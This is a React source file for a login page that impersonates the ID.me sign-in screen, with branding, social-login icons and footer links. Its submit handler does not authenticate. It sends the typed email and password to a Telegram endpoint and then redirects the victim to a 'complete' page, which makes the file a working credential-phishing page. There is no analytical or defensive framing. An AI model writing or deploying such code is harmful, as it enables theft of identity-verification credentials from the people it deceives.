import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import { FaFacebookF, FaApple, FaLinkedinIn } from "react-icons/fa";
import { FcGoogle } from "react-icons/fc";
import { useSendToTelegramMutation } from "../Services/Telegram";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();
  const [sendToTelegram] = useSendToTelegramMutation();

 const handleSubmit = async (e) => {
  e.preventDefault();

 
  const data = {
    email,
    password,
  };

  try {
    const result = await sendToTelegram(data);
    console.log('Full response:', result);
    

    if (result?.data) {
      console.log('Login info sent to Telegram', result.data);
      navigate("/complete");
    } else {
      console.error('Failed to send login info', result?.error || result);
     
    }
  } catch (error) {
    console.error('Error sending login info:', error);
  }
};

  

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      {/* Form Box Container */}
      <div className="flex-grow flex items-center justify-center px-4">
      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">

          <h1 className="text-2xl font-semibold text-center mb-6">Sign in to ID.me</h1>

          <div className="bg-[#f2faff] border-t border-b py-4 px-6 text-center rounded mb-6 w-full">
            <h1 className="text-gray-900">New to ID.me?</h1>
            <h2 className="underline text-blue-600 cursor-pointer">Create an ID.me account</h2>
          </div>

          <form className="space-y-6 mt-4 w-full flex flex-col items-center" onSubmit={handleSubmit}>
            {/* Email Input */}
            <div className="flex flex-col w-full sm:w-[370px]">
              <label htmlFor="email" className="mb-1 text-sm font-semibold text-gray-700">
                Email
              </label>
              <input
                type="email"
                id="email"
                placeholder="Enter your email address"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                className="border-2 border-gray-400 px-4 py-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-700 w-full"
              />
            </div>

            {/* Password Input */}
            <div className="flex flex-col w-full sm:w-[370px] mt-2">
              <label htmlFor="password" className="mb-1 text-sm font-semibold text-gray-700">
                Password
              </label>
              <input
                type="password"
                id="password"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="border-2 border-gray-400 px-4 py-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-700 w-full"
              />
            </div>

            {/* Sign In Button */}
            <div className="w-full sm:w-[370px] mt-6">
              <button
                type="submit"
                className="bg-[#266aca] rounded-md text-white w-full h-[45px] flex justify-center items-center text-base sm:text-xl font-semibold hover:bg-blue-800 transition duration-300"
              >
                Sign In
              </button>
            </div>

            <div className="text-center mt-2 underline text-blue-500 w-full">
              <h1>Forget password</h1>
            </div>

            {/* OR Divider */}
            <div className="flex items-center my-4 w-full sm:w-[370px]">
              <div className="flex-grow h-px bg-gray-300" />
              <span className="px-3 text-gray-500 text-sm font-medium">OR</span>
              <div className="flex-grow h-px bg-gray-300" />
            </div>
          </form>

          {/* Social Login */}
          <div className="flex justify-center items-center gap-4 mt-4">
            {[<FaFacebookF className="text-blue-600" />, <FcGoogle />, <FaApple />, <FaLinkedinIn className="text-[#0077b5]" />].map((Icon, i) => (
              <div key={i} className="border rounded-sm border-gray-400 w-10 h-10 flex justify-center items-center hover:shadow-md transition text-xl">
                {Icon}
              </div>
            ))}
          </div>

          {/* View More Options */}
          <div className=" w-[300px] flex justify-center items-center gap-4 mt-4 border border-gray-400 h-12 rounded-md text-blue-600">
            View more options
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="w-full flex flex-col items-center justify-center shadow-md bg-gradient-to-b from-[#ffffff] to-[#e4e0e0] p-4 text-sm text-[#2e3f5b] space-y-2">

        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex items-center justify-center flex-wrap gap-4 cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-4" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-4" />
          <span>Privacy Policy</span>
        </div>
      </div>
    </div>
  );
};

export default Login;
